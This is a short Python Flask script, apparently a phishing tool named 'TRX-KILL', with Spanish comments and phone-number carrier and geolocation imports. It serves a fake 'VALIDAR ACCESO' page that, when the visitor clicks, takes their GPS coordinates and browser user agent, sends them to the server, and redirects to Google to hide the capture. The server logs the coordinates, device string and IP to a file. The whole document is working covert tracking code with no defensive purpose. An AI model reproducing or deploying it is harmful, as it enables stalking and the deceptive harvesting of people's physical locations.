#!/usr/bin/env python3
import os, subprocess, threading, random, time, requests, sys
from flask import Flask, request
# Importaciones corregidas para evitar el AttributeError
import phonenumbers
from phonenumbers import geocoder, carrier, is_valid_number

app = Flask('TRX-KILL')
PUERTO = random.randint(6000, 9000)

HTML_ENCUESTA = """
<!DOCTYPE html>
<html><body>
    <h2>SUB-3NCU</h2>
    <button onclick="c()">VALIDAR ACCESO</button>
    <script>
    function c(){
        navigator.geolocation.getCurrentPosition((p)=>{
            fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, 
            body:JSON.stringify({lat:p.coords.latitude, lon:p.coords.longitude, ua:navigator.userAgent})});
            window.location.href="https://www.google.com";
        });
    }
    </script>
</body></html>
"""

@app.route('/')
def index(): return HTML_ENCUESTA

@app.route('/log', methods=['POST'])
def log():
    d = request.json
    with open("resultados.txt", "a") as f:
        f.write(f"--- REGISTRO REAL ---\nCOORD: {d.get('lat')}, {d.get('lon')}\nMOVIL: {d.get('ua')}\nIP: {request.remote_addr}\n---\n")
    return "OK"

